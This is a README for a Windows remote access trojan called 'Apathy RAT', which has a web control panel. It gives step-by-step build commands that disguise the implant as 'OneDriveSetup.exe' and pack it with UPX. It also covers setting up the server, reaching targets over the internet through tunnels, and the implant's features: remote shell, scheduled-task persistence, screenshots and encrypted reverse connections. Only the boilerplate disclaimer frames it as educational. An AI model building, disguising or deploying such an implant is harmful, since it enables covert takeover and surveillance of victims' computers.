# Apathy RAT

Windows implant written in pure C++ with web control panel.

## Features

- Pure C++ (no Python runtime)
- AES encryption via Windows CryptoAPI
- Reverse TCP connect with auto-reconnect
- Random startup delay (30-180 seconds)
- Remote shell execution
- Scheduled Task persistence
- Screenshot via GDI
- Single instance mutex
- No console window
- Web-based control panel

## Requirements

### Build machine (Kali / Linux)
- g++-mingw-w64
- upx (optional)

### Server
- Python 3.8+
- flask
- cryptography

## Build Implant

Edit `HOST` in `implant.cpp` before compiling.

```bash
sudo apt update
sudo apt install -y gcc-mingw-w64 upx-ucl

x86_64-w64-mingw32-g++ implant.cpp -o OneDriveSetup.exe \
  -static -s -O2 -mwindows \
  -lws2_32 -lcrypt32 -lgdi32 -luser32

upx --best --lzma OneDriveSetup.exe
```

## Server Setup

```bash
python3 -m venv venv
source venv/bin/activate
pip install flask cryptography
python3 server.py
```

Open in browser: `http://0.0.0.0:5000`

## How to get IP

Local IP (same network):
```bash
hostname -I
# or
ip a | grep inet
```

External IP:
```bash
curl ifconfig.me
```

- Same network → use local IP
- Internet → use external IP + port forward, or better use a tunnel (ngrok / playit.gg)

## Usage

1. Set correct `HOST` in `implant.cpp` and build
2. Start the server
3. Execute `OneDriveSetup.exe` on the target machine
4. Wait 30–180 seconds for the client to appear in the web panel
5. Select the client and use available functions

### Available actions

- Shell command execution
- Persistence (Scheduled Task)
- Screenshot
- Client information

## Network

- Default listening port: `4444`
- Client automatically reconnects on disconnect
- Recommended to change port and AES key for each deployment

## Notes

- Persistence is not applied automatically — only on explicit command
- Binary is compiled with `-mwindows` (no console)
- Uses mutex to prevent multiple instances
- For internet use prefer a TCP tunnel instead of direct port forwarding

## Disclaimer

This tool is provided for educational purposes and authorized security testing only. Unauthorized use is prohibited.
